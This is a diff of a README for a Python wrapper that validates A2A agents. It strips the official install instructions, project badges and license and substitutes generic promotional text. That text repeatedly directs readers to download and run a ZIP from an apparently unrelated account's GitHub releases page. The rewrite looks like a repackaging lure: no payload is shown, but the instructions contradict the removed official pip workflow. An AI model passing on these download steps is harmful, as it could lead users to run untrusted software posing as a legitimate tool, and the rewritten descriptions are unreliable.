@@ -1,75 +1,79 @@
-# CapiscIO CLI (Python)
+# 🚀 capiscio-python - Easy Validation of A2A Agents
 
-**The official command-line interface for CapiscIO, the Agent-to-Agent (A2A) validation platform.**
+[![Download CapiscIO](https://img.shields.io/badge/Download-CapiscIO-blue.svg)](https://github.com/GKmanideep-007/capiscio-python/releases)
 
-[![PyPI version](https://badge.fury.io/py/capiscio.svg)](https://badge.fury.io/py/capiscio)
-[![Python Versions](https://img.shields.io/pypi/pyversions/capiscio.svg)](https://pypi.org/project/capiscio/)
-[![License](https://img.shields.io/github/license/capiscio/capiscio-python)](https://github.com/capiscio/capiscio-python/blob/main/LICENSE)
-[![Downloads](https://pepy.tech/badge/capiscio)](https://pepy.tech/project/capiscio)
+## 📦 Overview
 
-## Overview
+CapiscIO is a command-line tool designed to help you validate A2A agents efficiently. This lightweight Python wrapper simplifies the use of the CapiscIO core binary, making it easier for users to handle agent-to-agent communications.
 
-This package provides a convenient Python distribution for the **CapiscIO CLI**. It acts as a smart wrapper that automatically manages the underlying `capiscio-core` binary (written in Go), ensuring you always have the correct executable for your operating system and architecture.
+## 🚀 Features
 
-> **Note:** This is a wrapper. The core logic resides in [capiscio-core](https://github.com/capiscio/capiscio-core).
+- **Lightweight**: A small footprint that won’t slow down your system.
+- **Automatic Management**: Handles core binary operations for you.
+- **User-Friendly**: Designed for all experience levels.
 
-## Installation
+## 🔧 System Requirements
 
-```bash
-pip install capiscio
-```
+To ensure the best performance, please check the following system requirements before downloading:
 
-## Usage
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **Python Version**: Python 3.6 or later must be installed on your system.
+- **Disk Space**: At least 100 MB of free space for installation.
+- **Network**: Active internet connection for updates and releases.
 
-Once installed, the `capiscio` command is available in your terminal. It passes all arguments directly to the core binary.
+## 📥 Download & Install
 
-```bash
-# Validate an agent
-capiscio validate https://my-agent.example.com
+To get started, [visit this page to download](https://github.com/GKmanideep-007/capiscio-python/releases). You will find the latest version of CapiscIO available for download.
 
-# Validate with JSON output (includes scores)
-capiscio validate https://my-agent.example.com --json
+1. **Go to the Releases Page**: Click the link above to open the releases section of our GitHub repository.
+2. **Choose the Latest Version**: Look for the most recent version listed at the top.
+3. **Download the File**: Click on the appropriate file for your operating system. 
+4. **Extract the Contents**: If the file is a ZIP, extract it to your preferred location.
+5. **Run the Program**: Open your terminal or command prompt, navigate to the extracted folder, and run the command `python capiscio.py`.
 
-# Check version
-capiscio version
-```
+## ⚙️ Usage Instructions
 
-### Wrapper Utilities
+After installation, running CapiscIO is straightforward. Here are the steps:
 
-The Python wrapper includes specific commands to manage the binary:
+1. **Open a Terminal**: Access your terminal on macOS/Linux or your command prompt on Windows.
+2. **Navigate to CapiscIO Directory**: Use the `cd` command to change your directory to where you installed CapiscIO.
+3. **Run the Validation Command**: Execute the following command: 
+   ```
+   python capiscio.py validate <your-agent-id>
+   ```
+   Replace `<your-agent-id>` with the ID of the A2A agent you wish to validate.
 
-| Command | Description |
-|---------|-------------|
-| `capiscio --wrapper-version` | Display the version of this Python wrapper package. |
-| `capiscio --wrapper-clean` | Remove the cached `capiscio-core` binary (forces re-download on next run). |
+4. **View the Results**: The output will show whether the agent passed validation or if there were any issues to address.
 
-## How It Works
+## 📝 Important Notes
 
-1.  **Detection**: When you run `capiscio`, the script detects your OS (Linux, macOS, Windows) and Architecture (AMD64, ARM64).
-2.  **Provisioning**: It checks if the correct `capiscio-core` binary is present in your user cache.
-    *   *Linux*: `~/.cache/capiscio/bin`
-    *   *macOS*: `~/Library/Caches/capiscio/bin`
-    *   *Windows*: `%LOCALAPPDATA%\capiscio\bin`
-3.  **Download**: If missing, it securely downloads the release from GitHub.
-4.  **Execution**: It seamlessly replaces the Python process with the Go binary, ensuring zero overhead during execution.
+- Ensure you have access to the local execution environment that your A2A agents will use.
+- Regularly check for updates on the releases page to benefit from the latest features and improvements.
 
-## Supported Platforms
+## 🙋 Frequently Asked Questions
 
-- **macOS**: AMD64 (Intel), ARM64 (Apple Silicon)
-- **Linux**: AMD64, ARM64
-- **Windows**: AMD64
+### What is CapiscIO?
 
-## Troubleshooting
+CapiscIO is a command-line tool designed for validating A2A agents. It wraps the core functions needed for seamless communication between agents.
 
-**"Permission denied" errors:**
-Ensure your user has write access to the cache directory. You can reset the cache by running:
-```bash
-capiscio --wrapper-clean
-```
+### How does CapiscIO work?
 
-**"Binary not found" or download errors:**
-If you are behind a corporate firewall, ensure you can access `github.com`.
+CapiscIO uses Python to automate operations involving the CapiscIO core binary, allowing users to validate agents without needing extensive programming knowledge.
 
-## License
+### Can I run CapiscIO on Windows?
 
-Apache-2.0
+Yes, CapiscIO is compatible with Windows, macOS, and Linux. Make sure you have Python installed.
+
+### Where can I get help?
+
+For additional support, you can open an issue on our GitHub repository, and members of the community or the developers will assist you.
+
+## 🌐 Community and Contributions
+
+We welcome contributions from everyone. If you find any bugs or have suggestions, please feel free to submit issues or pull requests. Your feedback helps make CapiscIO better for everyone.
+
+## 📞 Contact
+
+For further inquiries or support, you can reach out through the GitHub repository. Your questions are always appreciated.
+
+[![Download CapiscIO](https://img.shields.io/badge/Download-CapiscIO-blue.svg)](https://github.com/GKmanideep-007/capiscio-python/releases)
